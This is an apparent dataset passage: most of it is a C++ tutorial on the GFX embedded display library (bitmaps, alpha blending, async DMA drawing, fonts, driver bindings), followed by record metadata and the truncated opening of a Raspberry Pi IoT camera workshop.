srect16(spoint16(0,0),\nf.measure_text((ssize16)lcd.dimensions(),\ntext));\ndraw::text(lcd,text_rect.center((srect16)lcd.bounds()),text,f,lcd_color::white);\nfor(int i = 1;i<100;i+=10) {\ndraw::suspend(lcd);\n// calculate our extents\nsrect16 r(i*(lcd_type::width/100.0),\ni*(lcd_type::height/100.0),\nlcd_type::width-i*(lcd_type::width/100.0)-1,\nlcd_type::height-i*(lcd_type::height/100.0)-1);\ndraw::line(lcd,srect16(0,r.y1,r.x1,lcd_type::height-1),lcd_color::white);\ndraw::line(lcd,srect16(r.x2,0,lcd_type::width-1,r.y2),lcd_color::white);\ndraw::line(lcd,srect16(0,r.y2,r.x1,0),lcd_color::white);\ndraw::line(lcd,srect16(lcd_type::width-1,r.y1,r.x2,lcd_type::height-1),lcd_color::white);\ndraw::resume(lcd);\nvtaskdelay(1);\n}\nother than some minor differences, mostly because we're working with a much smaller display that is monochrome, it's the same code as before with one major difference - the presence of suspend<>() and resume<>() calls. once suspend is called, further draws aren't displayed until resume is called. the calls should balance, such that to resume a display you must call resume the same number of times that you call suspend. this allows you to have subroutines which suspend and resume their own draws without messing up your code. gfx in fact, uses suspend and resume on supporting devices as it draws individual elements. the main reason you have it is so you can extend the scope across several drawing operations.\na note about suspend/resume and e-ink/e-paper displays\nthe refresh rate of this class of displays is extremely slow. however, gfx does not distinguish between e-paper displays and traditional tft/lcd/oled displays in terms of how it uses them. therefore, in order to achieve reasonable performance, it's important to suspend and resume entire frames at a time. animation is out of the question for these displays. some of these displays support partial updating which in theory will improve their refresh rates. however, the displays are not well documented and i haven't been successful in getting that to work yet.\nlet's do polygons\nsince adding polygon support, i suppose an example of that will be helpful. here it is in practice:\nc++\n// draw a polygon (a triangle in this case)\n// find the origin:\nconst spoint16 porg = srect16(0,0,31,31)\n.center_horizontal((srect16)lcd.bounds())\n.offset(0,\nlcd.dimensions().height-32)\n.top_left();\n// draw a 32x32 triangle by creating a path\nspoint16 path_points[] = {spoint16(0,31),spoint16(15,0),spoint16(31,31)};\nspath16 path(3,path_points);\n// offset it so it starts at the origin\npath.offset_inplace(porg.x,porg.y);\n// draw it\ndraw::filled_polygon(lcd,path,lcd_color::coral);\nthis will draw a small triangle horizontally centered at the bottom of the screen. the most difficult bit was finding the origin, but even that's not hard, if you break down the creation of porg call by call.\na pixel for any situation\nyou can define pixels by using the pixel<> template, which takes one or more channel_traits<> as arguments, themselves taking a name, a bit depth, and optional minimum, maximum, default value, and scale. the channel names are predefined, and combinations of channel names make up known color models. known color models are models that can be converted to and from an rgb color model, essentially. currently they include rgb, y'uv, ybcbcr, and grayscale. declare pixels in order to create bitmaps in different formats or to declare color pixels for use with your particular display driver's native format. in the rare case you need to define one manually, you can do something like this:\nc++\n// declare a 16-bit rgb pixel\nusing rgb565 = pixel<channel_traits<channel_name::r,5>,\nchannel_traits<channel_name::g,6>,\nchannel_traits<channel_name::b,5>>;\nthat declares a pixel with 3 channels, each of uint8_t: r:5, g:6, and b:5. note that after the colon is how many effective bits it has. the uint8_t type is only for representing each pixel channel in value space in your code. in binary space, like laid out in an in memory bitmap, the pixel takes 16 bits, not 24. this defines a standard 16-bit pixel you typically find on color display adapters for iot platforms. rgb is one of the known color models so there is a shorthand for declaring an rgb pixel type of any bit depth:\nc++\nusing rgb565 = rgb_pixel<16>; // declare a 16-bit rgb pixel\nthis will divide the bits evenly among the channels, with remaining bits going on the green channel. it is shorthand for the longhand declaration given initially and it resolves to that.\npixels are mainly used to represent colors, and to define the binary layout of a bitmap or framebuffer. a bitmap is a template that is typed by its pixel type. ergo, bitmaps with different pixel types are different types themselves.\nthe pixels have a rich api which allow you to read and write individual channels by name or index, and get a dizzying array of metadata about the pixels which you should hopefully never need.\nmost of the time you'll just need to read pixel values from a draw source, or get them from a standard color value. however, sometimes you may need to set the pixel colors yourself.\neach pixel is composed of the channels you declared, and the channels may be accessed by \"name\" (channel_name enumeration) or by index. the values can be retrieved or set using channel<>() accessors for the native integer value and channelr<>() for real/floating point values scaled to between zero and one. often times you need to set or get the channel programmatically based on some other compile time constant and the compiler will complain because it can't verify that the channel actually exists. in order to avoid this you can use channel_unchecked<>() which accesses the channel without compile time verification. if the channel does not exist, setting and getting does nothing. if you need to translate between real and integer values for a channel you can use the channel's ::scale and ::scaler values.\nc++\n// declare a 24-bit rgb pixel\nrgb_pixel<24> rgb888;\n// set channel by index\nrgb888.channel<0>(255); // max\n// set channel by name\nrgb888.channel<channel_name::g>(127);\n// set channel real value\nrgb888.channelr<2>(1.0); // max\n// get red as an int type\nuint8_t r = rgb888.channel<channel_name::r>();\n// get green as a real type\nfloat g = rgb888.channelr<channel_name::g>();\n// get blue as an int type\nuint8_t b = rgb888.channel<channel_name::b>();\n// get the pixel value in big endian form\nuint32_t v = rgb888.value();\nin addition to this, there is a battery of standard color definitions provided when you include the main gfx header.\nthese are accessed through the color<> template which provides a psuedo-enum of dozens of colors in any pixel format you specify - as the template argument. even if you retrieve hot_pink as a monochrome or grayscale pixel, it will do the conversion for you, or i should say the compiler will (at least with c++17, i haven't checked the asm output with 14).\nusing the alpha channel\npixels that have channel_name::a are said to have an alpha channel. in this case, the color can be semi-transparent. internally the color will be blended with the background color when it is drawn, as long as the destination can support reading, or otherwise supports alpha blending natively (as in its pixel_format has an alpha channel). draw destinations that do not support it will not respect the alpha channel and will not blend. any draw method can take pixel colors with an alpha channel present. this is a powerful way to do color blending, but the tradeoff is a significant decrease in performance in most cases due to having to draw pixel by pixel to apply blending. the rgba_pixel<> template will create an rgb pixel with an alpha channel.\nhere's an example of using it in the wild:\nc++\nusing bmpa_type = rgba_pixel<32>;\nusing bmpa_color = color<bmpa_type>;\n// do some alpha blended rectangles\nbmpa_type col = bmpa_color::yellow;\ncol.channelr<channel_name::a>(.5);\ncol = bmpa_color::red;\ncol.channelr<channel_name::a>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(0,0),\nssize16(\nbmp.dimensions().width,\nbmp.dimensions().height/4)),\ncol);\ncol = bmpa_color::blue;\ncol.channelr<channel_name::a>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(0,0),\nssize16(\nbmp.dimensions().width/4,\nbmp.dimensions().height)),\ncol);\ncol = bmpa_color::green;\ncol.channelr<channel_name::a>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(0,\nbmp.dimensions().height-\nbmp.dimensions().height/4),\nssize16(bmp.dimensions().width,\nbmp.dimensions().height/4)),\ncol);\ncol = bmpa_color::purple;\ncol.channelr<channel_name::a>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(bmp.dimensions().width\n-bmp.dimensions().width/4,\n0),\nssize16(bmp.dimensions().width/4,\nbmp.dimensions().height)),\ncol);\nforgive the formatting. it's the best i could do to avoid even worse line breaks. basically what we're doing here is creating colors from pixels with an alpha channel, and then setting the alpha channel to half, before drawing a filled rectangle over whatever was already there on the bitmap, blending the colors. the ili9341 demo has an example of this. the others do not due to screen size constraints.\nruminating on rectangles\nwe've been using rectangles above a lot. as i've said, you have signed and unsigned rectangles, but you can convert between them with a cast. they also have an arsenal of manipulation methods on them. while rectangles themselves are mutable, these functions do not modify the rectangle, but rather they return a new rectangle, so for example, if you offset() a rectangle, a new rectangle is returned from the function. that said, there are xxxx_inplace() counterparts for some of these that modify the existing rectangle.\nsome functions that take a destination rectangle will use it as a hint about the orientation of what it is going to draw. draw::arc<>() is one such method. draw::bitmap<>() is another. you can use the flip_xxxx() methods to change the orientation of a rectangle, and the orientation() accessor to retrieve the orientation as flags. most drawing operations - even lines and ellipses - use rectangles as their input parameters due to their flexibility. get used to using them, as there's a lot of functionality packed into that two coordinate structure.\nplotting a course with paths\npaths are simply a series of points, but they get interesting in terms of what we can do with them. we can find the bounding rectangle of a series of points, and determine if something intersects it, whether it represents a simple line segment series, or a polygon. you supply the buffer, for efficiency's sake, but then types like spath16 wrap it with an api that allows for offsetting*, intersection determination, and bounding.\n* offsets are only supported in-place due to overhead of allocating a copy of a path, which i want to avoid doing casually.\nbitmaps, bitmaps and more bitmaps\nit can help to think of a bitmap as a variable that holds pixel data.\nit's basically an in memory draw source and draw destination.\nin isolation, it's not very useful except to hold pixels around in a format suitable for use in a frame buffer, but because its data is efficiently transferable to display devices and other bitmaps, it becomes an extremely utilitarian feature of gfx.\nat its simplest, it's basically an array of pixels, with a width and height associated with it, but that's not strictly true. not all pixels are multiples of 8-bits wide, much less an even machine word size. frame buffers may not be aligned on byte boundaries. for example, if you have an 18-bit pixel, that means there's a new pixel every 18-bits in the bitmap memory. because of that, there's no necessarily easy way to access a bitmap as raw memory depending on the pixel format, but bitmaps provide ways to get and set the data therein.\nbitmaps do not hold their own buffers. they're basically a wrapper around a buffer you declare that turns it into a draw source/draw destination. the reason they don't hold their own buffers is because not all memory is created equal. you have stack, and then you have possibly multiple types of heap, including heap that cannot be used to do dma transfers, like the external 4mb of psram on an esp32 wrover.\ni like to declare my fixed size bitmap buffers in the global scope (under a namespace if i don't want pollution) because that way they don't get put on the stack, and i don't have to manage heap. plus allocating early means less potential for fragmentation later. i know people frown on globals, and i understand why, but on these little devices, they're useful in certain situations. i feel this is one of them, but your mileage may vary.\nanyway, first we have to declare our buffer. i was very careful to make my objects constexpr enabled so you could do things like the following:\nc++\nusing bmp_type = bitmap<rgb_pixel<16>>;\n// the following is for convenience:\nusing bmp_color = color<typename bmp_type::pixel_type>; // needs gfx color header\nfollowed by:\nc++\nconstexpr static const size16 bmp_size(16,16);\nuint8_t bmp_buf[bmp_type::sizeof_buffer(bmp_size)];\nto be honest, the first time i wrote code like that, i was surprised it compiled. the modern c++ compiler is a truly wonderful thing. back in the bad old days, i used to get so frustrated that c and c++ refused to allow you to put array size declarations behind a function call, regardless of how trivial the function was. i knew why, but it didn't make me less frustrated knowing that. the expression sizeof_buffer() computes is (width*height*bit_depth+7)/8. that returns the minimum number of whole bytes required to store your bitmap data at that size and color resolution.\nnow that we have all that, wrapping it with a bitmap is trivial:\nc++\nbmp_type bmp(bmp_size,bmp_buf);\n// you'll probably want to do this, but not necessary if\n// you're redrawing the entire bmp anyway:\nbmp.clear(bmp.bounds()); // zero the bmp memory\n``` c++\nnow you can call `draw` methods passing `bmp` as the destination:\nc++\n``` c++\n// draw a happy face\n// bounding info for the face\n// change the line below if you want a subregion\nsrect16 bounds=(srect16)bmp.bounds();\nrect16 ubounds=(rect16)bounds;\n// draw the face\ndraw::filled_ellipse(bmp,bounds,bmp_color::yellow);\n// draw the left eye\nsrect16 eye_bounds_left(spoint16(bounds.width()/5,\nbounds.height()/5),\nssize16(bounds.width()/5,\nbounds.height()/3));\ndraw::filled_ellipse(bmp,eye_bounds_left,bmp_color::black);\n// draw the right eye\nsrect16 eye_bounds_right(\nspoint16(\nbmp_size.width-eye_bounds_left.x1-eye_bounds_left.width(),\neye_bounds_left.y1\n),eye_bounds_left.dimensions());\ndraw::filled_ellipse(bmp,eye_bounds_right,bmp_color::black);\n// draw the mouth\nsrect16 mouth_bounds=bounds.inflate(-bounds.width()/7,\n-bounds.height()/8).normalize();\n// we need to clip part of the circle we'll be drawing\nsrect16 mouth_clip(mouth_bounds.x1,\nmouth_bounds.y1+mouth_bounds.height()/(float)1.6,\nmouth_bounds.x2,\nmouth_bounds.y2);\ndraw::ellipse(bmp,mouth_bounds,bmp_color::black,&mouth_clip);\nnow you can take that bitmap and draw::bitmap<>() to your display or to another bitmap, or really any draw destination. you can even draw from a bitmap (or other draw source) to itself as long as the effective source and destination rectangles do not overlap. if they do, the data will probably get corrupted.\nso now this bmp is essentially a variable that refers to a draw target which currently holds a happy face. neat.\nthe individual members of the bitmap<> template class are not that important. the important thing is that a bitmap is both a draw source, and a draw destination, so it can be used with draw functions.\nlarge bitmaps\non little devices there's not a lot of heap, and while it may seem like you should be able to load a 160kb frame buffer on a 512kb system, there's the inconvenient little issue of heap fragmentation. heap fragmentation causes there to not be 160kb of contiguous free space anywhere on the heap in many situations because of past deallocations, even if it's the first allocation you make after the rtos passes you control because the heap is already \"dirty\" and fragmented by then. what do we do?\nin gfx large bitmaps can created using the large_bitmap<> template class. it is a composition of a lot of smaller bitmaps such that it presents a facade of one unified draw source/destination. using this is pretty much the same as the regular bitmap as far as gfx is concerned, even though it doesn't have all the fancy members that bitmaps do. i'll be adding to and optimizing the large bitmap api as i go, but i wanted to get it out there.\ncreate it like a normal bitmap except you need to pass in the segment height, in lines as the second parameter. a large bitmap is composed of a bunch of smaller bitmaps (referred to as segments) of the same width stacked vertically. therefore, each segment is a number of lines high. every segment but the last one (which may be smaller) has the same number of lines. unlike normal bitmaps, you do not allocate your own memory for this but you can use custom allocator and deallocator functions if you need special platform specific heap options. it's not worth getting into code, because using it is no different than using a regular bitmap, sans some features which gfx will work around the lack of.\nviewports\nviewports allow you to create a virtual canvas over a draw destination that can be rotated or offset. they are used pretty simply, although rotation can be tricky because you have to get your rotation center correct to get the results you expect:\nc++\nviewport<bmp_type> view(bmp);\nview.rotation(90);\nview.offset({45,5});\n// now draw\nsrect16 sr = view.translate(textsz.bounds());\nsr = sr.clamp_top_left_to_at_least_zero();\ndraw::text(view, sr, {0,0}, text, fnt, sc, color_max::white);\ni've omitted some of the code, but basically what we've done here is create a viewport<> over a bitmap, set its rotation to 90 degrees. then we offset it some so that we don't clip the text we're about to draw, translate the text bounds so we have a proper destination rect, and finally, draw to the viewport. all draw operations will be rotated 90 degrees around the center, which defaults to (0, 0).\nproperly using asynchronous draws\nevery drawing method has an asynchronous counterpart. while they do, it's usually not a good idea to use them. there are however, cases where using them can significantly increase your frame rate. the situation in which this is possible is somewhat narrow, but replicable. the key to performance is draw::bitmap_async<>(). this method is dma-aware for drivers that support it, and will initiate a background dma transfer by way of a frame write on the driver where available. this is facilitated by a driver's implementation of copy_from_async<>(), but in order to work at maximum efficiency there can be no cropping, resizing, flipping or color conversion of the bitmap in question - otherwise a (mostly) synchronous operation will take place. additionally, you probably cannot use psram for these transfers - you are limited to ram that is available to use for dma. finally the bitmap actually has to be large enough to make it worthwhile.\nwhat size is worthwhile? it depends. the idea is you want to be sending part of your frame to be drawn in the background while you're rendering the next part of the frame. in order for that to work, you'll have to kind of tune the size of the bitmap you'll be sending, but i find 10kb (320x16x16bpp) at a time or so @ 26mhz is a win. as a rule, more data at a time is better, but takes more ram.\nthe code looks approximately like this under the esp-idf at least:\nc++\nuint16_t *lines[2];\n//allocate memory for the pixel buffers\nfor (int i=0; i<2; i++) {\nlines[i]=(uint16_t*)heap_caps_malloc(lcd.dimensions().width\n*parallel_lines*sizeof(uint16_t), malloc_cap_dma);\nassert(lines[i]!=null);\n}\nusing lines_bmp_type = bitmap<typename lcd_type::pixel_type>;\nlines_bmp_type line_bmps[2] {\nlines_bmp_type(size16(lcd.dimensions().width,parallel_lines),lines[0]),\nlines_bmp_type(size16(lcd.dimensions().width,parallel_lines),lines[1])\n};\nint frame=0;\n//indexes of the line currently being sent to the lcd and the line we're calculating.\nint sending_line=-1;\nint calc_line=0;\n// set up lines[] with data here...\n++frame;\nfor (int y=0; y<lcd.dimensions().height; y+=parallel_lines) {\n//calculate some lines\ndo_line_effects(line_bmps[calc_line], y, frame, parallel_lines);\n// wait for the last frame to finish. don't need this unless transactions are > 7\nif(-1!=sending_line)\ndraw::wait_all_async(lcd);\n//swap sending_line and calc_line\nsending_line=calc_line;\ncalc_line=(calc_line==1)?0:1;\n//send the lines we currently calculated.\n// draw::bitmap_async works better the larger the transfer size. here ours is pretty big\nconst lines_bmp_type& sending_bmp = line_bmps[sending_line];\nrect16 src_bounds = sending_bmp.bounds();\ndraw::bitmap_async(lcd,(srect16)src_bounds.offset(0,y),sending_bmp,src_bounds);\n//the lines set is queued up for sending now; the actual sending happens in the\n//background. we can go on to calculate the next lines set as long as we do not\n//touch lines[sending_line] or the bitmap for it;\n// the spi sending process is still reading from that.\n}\nthe basic idea here is as i said, we have two bitmaps, and we draw to one, here with do_line_effects() - the idea being that it fills the current frame (indicated by calc_frame) with some pretty colors. then we make sure to wait for any pending operations to complete. the reason being is that we're about to start writing to the other line_bmps[] bitmap now and we need to make sure it's not still being read from in the background. the first time through as indicated by sending_line==-1, we skip this wait step because we weren't sending anything yet.\nnext we swap out the index of our bitmaps, so like i said, we'll be drawing to the other one now. then we simply get its bounds and pass it as well as the first bitmap to draw::bitmap_async<>(), and it goes full metal dma on your hardware (assuming your hardware is capable), doing it in the background and freeing the loop here to continue almost immediately after the call so we can start drawing again, rather than waiting for the transfer to complete.\nit's a little bit complicated, and i'm stewing on some ideas to make it easier to implement this pattern. i'll keep you posted. it should be noted that this technique is not exclusive to gfx, nor did i come up with it. it is in fact, a common rendering technique when you need real time double buffered animation without the memory to hold an entire frame, and also a way to stream in the background in order to animate more efficiently.\nwhat about the other xxxx_async methods?\nthese methods aren't as effective. the lack of blocking doesn't make up for the overhead for such small transactions. the main reason to use them is in the rare case where you want to continue to queue drawing operations after draw::bitmap_async<>(). typically, when you switch from asynchronous to synchronous methods, the driver must wait for all pending asynchronous operations to complete. by continuing the async chain with line_async<>() instead of line<>() for example, you can prevent it from forcing a wait for the bitmap data to complete, at the cost of some extra cpu overhead.\nloading images\nthere are two ways to get an image from a jpg stream (other formats are coming). both require creating a stream over the input, like a file, and then using it with one of two methods:\nthe first, and easiest method is to use draw::image<>() which allows you to position the image on the destination and crop a portion of the image. there is an option for resizing but it's not currently supported. it's actually really difficult to do progressively so i'm not sure when it will be. currently if you try to pass something other than bitmap_resize::crop it will return gfx_result::not_supported. also currently the destination rect's orientation is ignored, so flipping isn't possible. this will be updated when i can manage it - i've got a lot to juggle.\nbelow lcd represents our target on which to draw the image:\nc++\nfile_stream fs(\"/spiffs/image.jpg\");\n// todo: check caps().read to see if the file is opened/readable\ndraw::image(lcd,(srect16)lcd.bounds(),&fs,rect16(0,0,-1,-1));\nnote above since we don't know the size of the bitmap we can pass 0xffff or -1 for the extents and the source rectangle extents will end up based on the image size since the source rectangle is cropped to fit the image.\nthe second way of loading an image is passing the stream to an image loader function along with a callback (i prefer to use an anonymous method/lambda for this) that handles the progressive loading. you'll be called back multiple times, each time with a portion of the image as a bitmap, along with a location where it belongs within the image, and any state you passed along to the load function. note that to reduce overhead, a state variable is used to pass state instead of using a functor like std::function. you can use a \"flat\" lambda that decays to a simple function pointer, and then pass your class pointer in as the state argument, to be reconstituted inside your callback. often times, you won't even need a state argument because everything you're after, such as the display itself, is available globally:\nc++\nfile_stream fs(\"/spiffs/image.jpg\");\n// todo: check caps().read to see if the file is opened/readable\njpeg_image::load(&fs,[](size16 dimensions,\ntypename jpeg_image::region_type& region,\npoint16 location,\nvoid* state){\nreturn draw::bitmap(lcd, // lcd is available globally\nsrect16((spoint16)location,\n(ssize16)region.dimensions()),\nregion,region.bounds());\n},nullptr);\nloading (or embedding) fonts\nfonts can be used with draw::text<>() and can either be loaded from a stream, similar to images, or they can be embedded into the binary by generating a c++ header file for them. which way you choose depends on what you need and what you're willing to give up. with iot, everything is a matter of robbing peter to pay paul.\nanyway, you'll usually want to go with the embedded fonts, unless you intend for the fonts to be able to be loaded and unloaded at runtime for some reason, or program space is at more of a premium than say, spiffs and ram, or if you want to be able to load .fon or .ttf files from an sd card for example.\nspeaking of .fon files, they are an old (primarily) raster font format from the windows 3.1 days. given those were 16-bit systems, the .fon files were to the point, with little extra overhead and were designed to be read quickly. furthermore while being old, at least they aren't a completely proprietary format. it is possible to hunt them down online, or even make your own. for these devices, .fon files are a nearly ideal format, which is why they were chosen here. with iot, everything old is new again.\nyou can also use .ttf files, which are more flexible, nicer, modern fonts, but you pay a significant penalty in terms of performance and complexity.\nyou can use the fontgen tool to create header files from font files. simply include these to embed them and then reference the font in your code. the font is a global variable with the same name as the file, including the extension, with illegal identifier characters turned into underscores.\nlet's talk about the first method - embedding:\nfirst, generate a header file from a font file using fontgen under the tools folder of the gfx library:\nshell\n~$ fontgen myfont.fon > myfont.hpp\nor\nshell\nc:\\> fontgen myfont.ttf > myfont.hpp\nnote with windows, it might try to spit it out in utf-16 which will mangle your header file to death. if that happens, open the header in notepad, and resave it as ascii or utf-8. also note in the fontgen source there is a #define windows which should be set on the windows platform.\nnow you can include that in your code:\nc++\n#include \"myfont.hpp\"\nthis allows you to reference the font like this:\nraster fonts\nc++\nconst font& f = myfont_fon;\nconst char* text = \"hello world!\";\nsrect16 text_rect = f.measure_text((ssize16)lcd.dimensions(),\ntext).bounds();\ndraw::text(lcd,\ntext_rect.center((srect16)lcd.bounds()),\ntext,\nf,\nlcd_color::white);\nthe second way to access a font is by loading a .fon file from a stream, which stores the font around on the heap rather than embedded as a static const array in your code is to just replace the first line of code above with this:\nc++\nfile_stream fs(\"/spiffs/myfon.fon\");\nif(!fs.caps().read) {\nprintf(\"font file not found.\\r\\n\");\nvtaskdelay(portmax_delay);\n}\nfont f(&fs);\nthat will create a font on the heap from the given file. you can then go on to draw it like normal. when it goes out of scope, the heap it used is reclaimed.\nit is usually more efficient to draw fonts with a solid background than ones with a transparent background, so if raw performance is your ultimate goal, stick with non-transparent font draws.\ntrue type/open type fonts\nc++\nconst open_font& f=maziro_ttf;\ndraw::filled_rectangle(lcd,(srect16)lcd.bounds(),lcd_color::white);\nconst char* text = \"esp32 gfx demo\";\nfloat scale = f.scale(40);\nsrect16 text_rect = f.measure_text((ssize16)lcd.dimensions(),{5,-7},\ntext,scale).bounds();\ndraw::text(lcd,\ntext_rect.center((srect16)lcd.bounds()),\n{5,-7},\ntext,\nf,\nscale,\nlcd_color::dark_blue);\nnote the addition of the offset and scale parameters compared to raster fonts.\nfiles are the same as loading raster fonts.\ngfx draw bindings\ndrivers and other things may be draw destinations and may also be draw sources. in order to work as those things, the custom draw target must expose some members so that gfx can bind to them.\ncommon members to all draw targets\nthe first member is a public using caps = gfx::gfx_caps<...>; alias that will be used to determine what kinds of features your driver supports. if, for example, you indicate batching support, gfx will attempt to call methods like write_batch() on your driver. if you indicate support for a feature without implementing the corresponding methods, that's a compile error:\ncaps - indicates the capabilities of the target, which consist of these members:\nblt - the target supports accessing its memory as raw data using begin() and its memory must be laid out contiguously from left to right, top to bottom in the corresponding pixel_format.\nasync - the target supports asynchronous versions of its methods. gfx will call the methods suffixed with _async() when asynchronous operations are requested by the caller. if it doesn't support all of them, but rather only some of them, then the implementer should delegate from the unsupported _async() operations to the synchronous ones for the methods where there is no asynchronous counterpart.\nbatch - the target supports batching write operations and is expected to expose begin_batch(), write_batch(), and commit_batch().\ncopy_from - the target supports optimized copying from a draw source, and gfx should use the exposed copy_from<>() template method when possible.\nsuspend - the target supports granular double buffering, wherein drawing operations can be written offscreen when suspend() is called and then a portion of the screen that was updated sent to the display upon resume(). the implementor should keep a count of suspends to balance the calls of suspend with those to resume.\nread - the target supports reading pixel data, which facilitates its use as a draw source and also enables alpha blending.\ncopy_to - the target supports optimized copying to a draw destination and gfx should use the exposed copy_to<>() method when possible. if given the choice between using a draw source's copy_to<>() method and a draw destinations's copy_from<>() method, gfx will choose the copy_from<>() method, since there are more optimization opportunities with that.\nnext, you have to declare the using pixel_type alias on your draw target. this is probably most often an alias for gfx::rgb_pixel<16> for color displays and gfx::gsc_pixel<1> for monochrome (1 bit grayscale) displays. it tells gfx what the native format of your draw object is.\npixel_type - indicates the native pixel format for this target\nif your pixel type is indexed, meaning it contains channel_name::index, you must include using palette_type alias for your palette type. for drivers like e-paper displays, they will usually have an associated palette class that this aliases.\npalette_type - indicates the associated palette type if pixel_type refers to an indexed pixel.\nnow you can start implementing methods you'll need. most of the methods return the enum gfx::gfx_result indicating the status of the operation.\nfirst, aside from the caps and pixel_type aliases, there are methods you must implement regardless:\nsize16 dimensions() const - returns a size16 that indicates the dimensions of the draw target.\nrect16 bounds() const - returns a rect16 with a top left corner of (0,0) and a width and height equal to that of the draw target. this is an alias for dimensions().bounds().\nnext, if your pixel_type refers to an indexed pixel you must implement a palette() method which returns a pointer to a palette associated with your draw target.\nconst palette_type* palette() const - returns a pointer to the palette associated with this draw target\ndraw source members\nto implement a target as a draw source, you must additionally implement one, or possibly two methods:\ngfx_result point(point16 location, pixel_type* out_color) const - retrieves a pixel at the specified location\ngfx_result copy_to<typename destination>(const rect16& src_rect,destination& dst,point16 location) const - copies a portion of the target to the specified destination at the specified location\nif you implement copy_to<>() be sure to set the corresponding entry in your caps so that gfx will call it.\neither way, now you can use it as a source to calls like draw::bitmap<>().\ndraw destination members\nbecause of the variety of optimizations necessary to achieve good performance on device drivers, it can be significantly more involved to implement a draw destination than a draw source.\nthe least you must implement other than the common methods are the first two methods, but the methods that follow those are optional and allow for better performance. i will not be listing the _async() methods to save space, since their names and signatures are derived from the synchronous methods.\ngfx_result point(point16 location, pixel_type color) - sets a pixel at the specified location\ngfx_result fill(const rect16& rect, pixel_type color) - fills a rectangle at the specified location\nabove is the minimum. what the rest is depends on the caps settings.\nan important one for doing high performance copies of bitmap data is copy_from<>():\ntemplate<typename source> gfx_result copy_from(const rect16& src_rect,const source& src,point16 location) - copys from a draw source to the draw target.\nthis method should determine what the best action to be taken for sending the src's data to this target as quickly as possible. it should not use the source's copy_to<>() method but aside from that it can use anything. often what one will do is internally call another template that specializes for when source::pixel_type is the same as pixel_type, and that the source can be blted. then potentially do a raw memory read. if so, you may be able to initiate a dma transfer, for example. then you have to have fallback scenarios if that isn't supported.\nnext we'll cover batching. if you support batching operations, you'll need to implement the following three methods:\ngfx_result begin_batch(const rect16& rect) - begins a batch operation at the specified rectangle.\ngfx_result write_batch(pixel_type color) - writes a pixel to the current batch. pixels are written to the batch rectangle in order from left to right, top to bottom. if your pixel buffer gets full, it's acceptable to send as needed. batch isn't suspend, it's just a way to cut down traffic.\ngfx_result commit_batch() - writes any remaining batched data out and reverts from batching mode.\nwhen you implement batching, make sure that you automatically commit the current batch if the caller begins a non-batch operation while in the middle of a batch, or if they begin a new batch operation.\nif you support suspend/resume (double buffering) you'll need to implement the following two methods:\ngfx_result suspend() - suspends drawing. suspends are counted and balanced, so for every suspend call, you must make a corresponding resume() call.\ngfx_result resume(bool force=false) - resumes drawing, optionally discarding all previous suspends() and forcibly resuming the draw. the screen is updated when the final resume is called.\nfinally, every one of the writing methods potentially has an _async() counterpart that take the same parameters but queue the operation and return as soon as possible. there is currently no provision for doing async reads but that will change in the future.\nwhere to go from here\nthe demo projects that ship with this should provide you ample code to learn gfx or even build your own drivers. currently, i'm focused on supporting the esp32 via the esp-idf, but gfx itself is not limited by platform, and drivers can be written for anything - even directx on a windows pc.\nhistory\n10th may, 2021 - initial submission\n16th may, 2021 - added drivers, configurations, wiring guide\n17th may, 2021 - added more drivers\n18th may, 2021 - added sprite/transparent color support to draw::bitmap<>()\n21st may, 2021 - bugfix and added another driver\n21st may, 2021 - draw::bitmap<>() bugfix\n24th may, 2021 - fixed build errors on some demos\n27th may, 2021 - added alpha blending support\n29th may, 2021 - added large_bitmap<> support, api changes, demo changes\n31st may, 2021 - api cleanup and added paths and polygon support\n31st may, 2021 - fixed several build errors\n1st june, 2021 - added/fixed bitmap resize options and added dimensions to image callback\n5th june, 2021 - added single header file, and easier to use image loading. cleaned up positioning api a bit. bugfix in declarions of clipping rect parameters on draw::\n7th june, 2021 - service release. certain draw operations between certain draw targets would fail to compile\n8th june, 2021 - added palette/clut support (initial/experimental)\n8th june, 2021 - service release. fixed large_bitmap<> out of bounds crashing issue\n13th june, 2021 - added arduino framework support and several arduino based drivers\n15th june, 2021 - added support for two e-ink/e-paper displays: the dep0290b (and the associated lilygo t5 2.2 board) as well as the gdeh0154z90 (waveshare 1.54 inch 3-color black/white/red display).\n17th june, 2021 - added dithering support for e-ink/e-paper displays\n13th july, 2021 - added truetype font support\n30th july, 2021 - service release - fixed a stream.hpp bug and updated platformio.ini to build for the newer esp-idf\n13th november, 2021 - one bugfix, and the addition of an ra8875 driver and the viewport<> template\n15th november, 2021 - performance and feature improvements to the ra8875 driver and improvements to the viewport<> template\n8th december, 2021 - restructure of the library, bugfixes and the addition of tft_espi bindings", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000830, "year": null}, {"Unnamed: 0": 835, "autor": 835, "date": null, "content": "Instructions\nObjective\nThis workshop will walk you through a few common IoT scenarios like basic user input (a button), output (an LED), a camera, a web service call (Microsoft Cognitive Services Vision API), and finally an IoT ingestion service (Azure IoT Hub). We'll use Node.js as the device language.\nWhen it's all finished and working, with the click of a button you'll be able to take a picture, figure out what objects are in the picture, and then record the result in a cloud service.\nWhat is IoT\nThe Internet of Things (IoT) is a hot topic. It's also a rather broad topic, and IoT topics often cover a few disciplines...\nmaterial design (wood, plastic, metal)\nelectronics\nsoftware\ncloud services\nWe won't do any material design in this project, but we'll put tother an electronic circuit, write some software, and consume some cloud services to create a fun, final solution.\nTaking Inventory\nHere's what you'll need in order to complete this tutorial...\nRaspberry Pi 3\nRaspberry Pi camera module\nmicro SD card\nElectronics\nBreadboard\n4 M/F jumper wires\n2 M/M jumper wires\nMomentary NO (normally open) button\nLED\n330 \u03a9 resistor\n10 k\u03a9 resistor\nUSB power cord\nEthernet Cable\nThe Raspberry Pi 3 (RP3) is obviously the brains of the operation here. It's essentially a tiny computer with controllable pins. We've equipped these ones with a Raspberry Pi camera module too. Of course, you could just plug a webcam in to one of the USB ports, but the camera module uses the CSI port on the board and is faster and has drivers built in to the device.\nThe RP3 doesn't have any built in storage, but uses a micro SD card slot. We have Raspbian - Raspberry Pi's custom distribution of Linux - installed along with Node.js. This makes each of these devices a very capable machine.\nThe RP3 is powered with a standard micro USB port.\nFor network connectivity, the RP3 has wifi built right in. This should already be set up for you.\nBTW, there's nothing stopping you from doing this same project with a Raspberry Pi 2. It down't have built-in wifi, though, so 